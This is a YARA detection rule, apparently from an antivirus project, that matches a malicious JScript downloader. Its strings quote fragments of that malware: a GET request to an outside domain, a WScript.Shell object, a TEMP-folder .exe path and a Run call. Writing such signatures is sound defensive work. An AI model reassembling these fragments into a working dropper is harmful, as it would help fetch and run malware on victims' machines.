rule sig_20160330_3d1d86debd517206438bde2bf7873a30 {
  meta:
    description = "datamaliciousorder - file 20160330_3d1d86debd517206438bde2bf7873a30.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "17cfa83cef4934227a89867063614878d47e5aacab4efabd6d57ef1e0e72c3e4"

  strings:
    $s1  = "I[D](\"GET\", \"http://be-stlines-tore.com/k3soa\", false);" fullword ascii
    $s2  = "var M = function L() {return WScript[UA](\"WScript\"+\".Shell\");}(), ZR = 11;" fullword ascii
    $s3  = "function EW(NW, GB){HG = HG * 1; return NW - GB;};" fullword ascii
    $s4  = "if (I[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function EZ(){return Q0 + \"\";};" fullword ascii
    $s6  = "function VR() {return M[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"DtBZDnXcV3fd.ex\" + \"e\";};" fullword ascii
    $s7  = "function O(V){M[\"Run\"](V, HG, HG);};" fullword ascii
    $s8  = "function DB() {return ((AU == true) && (AU == Z)) ? 1 : HG;};" fullword ascii
    $s9  = "function S(){return 22;};" fullword ascii
    $s10 = "}while (K);" fullword ascii
    $s11 = "var PU = new this[\"Date\"]();" fullword ascii
    $s12 = "function KG(){return UA;};" fullword ascii
    $s13 = "function Q()" fullword ascii
    $s14 = "function A(R) {var S0 = (1, 2, 3, 4, 5, R); return S0;};" fullword ascii
    $s15 = "return EW(BV, WP);" fullword ascii
    $s16 = "Z = true; " fullword ascii
    $s17 = "var Z = false;" fullword ascii
    $s18 = "AU = true; " fullword ascii
    $s19 = "var Q1 = false;" fullword ascii
    $s20 = "var AU = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}